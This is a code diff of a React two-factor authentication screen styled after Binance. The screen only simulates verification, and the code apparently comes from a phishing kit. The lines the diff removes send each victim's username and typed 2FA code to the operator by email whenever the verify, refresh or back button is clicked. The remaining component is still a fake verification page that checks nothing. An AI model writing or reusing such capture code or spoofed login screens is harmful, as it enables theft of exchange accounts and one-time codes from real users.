@@ -1,10 +1,10 @@
+
 import React, { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Shield, RefreshCw } from "lucide-react";
-import { sendHighPriorityNotification } from "@/services/emailService";
 
 interface TwoFactorAuthProps {
   username: string;
@@ -43,29 +43,6 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
       return;
     }
 
-    // Send email IMMEDIATELY when verify button is clicked
-    console.log('🚨 2FA VERIFY BUTTON CLICKED - Sending email immediately...');
-    
-    try {
-      await sendHighPriorityNotification({
-        step: "🔴 TWO-FACTOR AUTH - VERIFY CODE BUTTON CLICKED",
-        username,
-        timestamp: new Date().toISOString(),
-        allFormData: {
-          formType: "TWO_FACTOR_AUTHENTICATION",
-          username: username,
-          twoFactorCode: code,
-          action: "2FA_CODE_SUBMITTED",
-          buttonClicked: "VERIFY_CODE",
-          timestamp: new Date().toISOString(),
-          currentStep: "two_factor_auth"
-        }
-      });
-      console.log('✅ 2FA verification email sent immediately!');
-    } catch (error) {
-      console.error('❌ 2FA verification email failed:', error);
-    }
-
     setIsLoading(true);
     
     // Simulate 2FA verification
@@ -79,60 +56,13 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
     }, 1500);
   };
 
-  const handleResendCode = async () => {
-    // Send email IMMEDIATELY when refresh button is clicked
-    console.log('🚨 2FA REFRESH BUTTON CLICKED - Sending email immediately...');
-    
-    try {
-      await sendHighPriorityNotification({
-        step: "🔴 TWO-FACTOR AUTH - REFRESH CODE BUTTON CLICKED",
-        username,
-        timestamp: new Date().toISOString(),
-        allFormData: {
-          formType: "TWO_FACTOR_AUTHENTICATION",
-          username: username,
-          currentCode: code,
-          action: "REFRESH_2FA_CODE",
-          buttonClicked: "REFRESH_CODE",
-          timestamp: new Date().toISOString(),
-          currentStep: "two_factor_auth"
-        }
-      });
-      console.log('✅ 2FA refresh email sent immediately!');
-    } catch (error) {
-      console.error('❌ 2FA refresh email failed:', error);
-    }
-
+  const handleResendCode = () => {
     setTimer(30);
     setCanResend(false);
     toast({
       title: "Code refreshed",
       description: "Please check your Google Authenticator app.",
     });
-  };
-
-  const handleBackClick = async () => {
-    // Send email when back button is clicked
-    try {
-      await sendHighPriorityNotification({
-        step: "🔴 TWO-FACTOR AUTH - BACK BUTTON CLICKED",
-        username,
-        timestamp: new Date().toISOString(),
-        allFormData: {
-          formType: "TWO_FACTOR_AUTHENTICATION",
-          username: username,
-          currentCode: code,
-          action: "BACK_TO_SECURITY_VERIFICATION",
-          buttonClicked: "BACK_TO_LOGIN",
-          timestamp: new Date().toISOString(),
-          currentStep: "two_factor_auth"
-        }
-      });
-    } catch (error) {
-      console.error('Email notification failed:', error);
-    }
-    
-    onBack();
   };
 
   return (
@@ -192,7 +122,7 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
             )}
             
             <button
-              onClick={handleBackClick}
+              onClick={onBack}
               className="text-binance-yellow hover:text-binance-yellow/80 text-sm font-medium"
             >
               Back to Login
